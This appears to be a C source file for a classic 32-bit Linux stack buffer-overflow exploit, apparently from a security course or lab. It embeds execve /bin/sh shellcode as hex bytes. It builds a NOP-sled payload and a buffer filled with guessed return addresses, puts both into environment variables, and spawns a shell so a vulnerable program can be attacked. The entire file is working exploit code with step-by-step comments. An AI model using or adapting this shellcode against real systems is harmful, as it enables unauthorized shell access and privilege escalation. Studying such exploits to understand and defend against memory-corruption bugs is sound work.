#include <stdio.h>
#include <string.h>
#include <unistd.h>
#define BUFSIZE 550
#define EGGSIZE 528
#define ALIGNMENT 0 

/* This is the shellcode for injection */
char sc[]=
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89"
   "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
   "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff"
   "\xff\xff/bin/sh";

void main(int argc, char* argv[]) {
    char *env[2] = {sc, NULL};
    /* this is the buffer used to overflow the program stack*/
    char buf[BUFSIZE];
    /* egg is the injection code that we will hide it in env*/
	char egg[EGGSIZE];
    int i;
    /* gussing the offset of our egg in env on stack*/
	int offset = 0;
    int *ap = (int *)(buf + ALIGNMENT);
    /* this is the start address of programs stack*/
    int ret = 0xbffffffa;
	if (argc>1) offset = atoi(argv[1]);
		ret -= offset;
	printf("ret = %p\n",ret);
	/* fill the buffer with our guessed address*/
    for (i = 0; i < BUFSIZE - 4; i += 4)
        *ap++ = ret;
    /* put a null in the end of buffer so that it looks like a string*/
	buf[BUFSIZE - 1] = '\0';
	char* ptr = egg;
	/* fill the egg with NOP so that incresing our*/
	/*chance of gussing the right place of egg*/
	for (i = 0; i < EGGSIZE - strlen(sc) - 1; i++)
		*(ptr++) = 0x90;
	/* put the shell code at the rest of egg*/
	for (i = 0; i < strlen(sc); i++) 
		*(ptr++) = sc[i];
	/* make it looks like a string*/
	egg[EGGSIZE - 1] = '\0';
	memcpy(egg,"EGG=",4);
	memcpy(buf,"RET=",4);
	/* hide both the buffer and egg into env*/
	putenv(buf); 
	putenv(egg); 
	system("/bin/bash");
}
